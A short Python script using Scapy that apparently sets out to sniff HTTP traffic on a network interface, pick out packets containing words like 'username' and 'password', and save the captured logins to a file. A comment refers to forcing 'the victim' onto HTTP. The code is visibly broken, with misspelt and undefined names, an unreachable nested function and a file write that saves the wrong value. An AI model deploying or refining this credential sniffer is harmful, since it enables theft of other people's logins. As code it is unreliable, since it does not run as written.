'''
This Tool Use Scapy Package!
Feel Free TO Edit It Is Yours!
I Will Clean The Code On That Update And Add Some Things!
'''
import scapy.all as scapy 
from scapy.layers import http

def SmallBanner():
	Banner = "\t\t\t\t[+] << PACKET-SNIFFER >> [+]"
	print(Banner)

# Get Inputs First!
PossibleLoginList = []
InterFace = input("\n[+] Enter Interface: ") # EX: eth0 , wlan0

def StartSniffData(NetowrkInterface):
	scapy.sniff(iface=NetworkInterface,store=False,prn=SniffNetworkTrafic)

def GetDataFromHTTP(packet): # Get Data From HTTP Requests And Responses If You Want To Capture HTTPS Reqqests And Responses You Have To Force The Victim To Use HTTP Protocol!
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
	def GetLoginDataFromSites(packet):
		if packet.haslayer(scapy.Raw):
			DataLoaded = packet[scapy.Raw].load
			KeyWords = ["username","login","password","user","pass"] # You Can Add More KeyWords Here!
			for LoginKeyWord in KeyWords:
				if LoginKeyWord in DataLoaded:
					return DataLoaded
					break # LOL IDK Why I But Break If There is An Return Function But I Will Leave That Here LOL

def SniffNetworkTrafic(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP REQUEST >>" + url)

		LoginData = GetLoginDataFromSites(packet)
		if LoginData: # If Login Data Returns 'True' Then Do That Print Function
			PossibleLoginList.append(LoginData)
			print("\n[+] Possible User/Password >> {0} \n".format(LoginData))

def ExtractAllPossibleLoginsOnTXT():
	FileName = input("Give Me A Name For Logins File: ") # EX : Login
	for Data in PossibleLoginList:
		with open('{0}.txt'.format(FileName),'w') as LoginsFile:
			LoginFile.write("{0}\n".format(FileName))
		print("[+] Data Saved!")

# Start Functions After Get Inputs!
SmallBanner()
StartSniffData(InterFace)
ExtractAllPossibleLoginsOnTXT()
